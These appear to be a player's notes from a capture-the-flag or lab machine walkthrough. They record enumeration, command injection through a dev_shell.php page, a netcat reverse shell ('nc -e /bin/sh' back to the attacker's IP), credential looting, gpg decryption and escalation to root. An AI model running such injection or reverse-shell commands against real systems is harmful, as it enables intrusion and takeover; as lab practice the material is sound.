Website data

 - Dirbuster not showing anything much more than what's available and what's in the robots.txt files
 - according to memo, logins are kept off server
 - /dev_shell.php is going to be of use
   *not full shell
   *can use commands through /bin/bash | [my_cmd]
   */bin/bash | pwd >>>>  /var/www/html 
   *trying reverse shell with /bin/bash | nc -e /bin/sh 192.168.83.107 4444  (me: nc -lvp 4444)

 - reverse shell works
   *shows flag.txt in / directory, can't read unless root
   *home directory: bob, elliot, jc, seb

 - bob: *login.txt.gpg*, notes about staff, notes.sh (weird, check back), apparently a backdoor FTP, python scripts(useless)
 - elliot: passwords
 - seb: nothing
 - jc: nothing

 - ssh w/ elliot credentials, download /home/bob/login.txt.gpg & notes.sh
 - First letter of each line in notes.sh = HARPOCRATES (maybe capital,lowercase?) maybe for gpg
 - gpg -d login.txt.gpg > login.txt (w/ HARPOCRATES) >>>> bob:b0bcat_
 LETS TRY IT > SUCCESS, root? > sudo su -l >>> ROOT
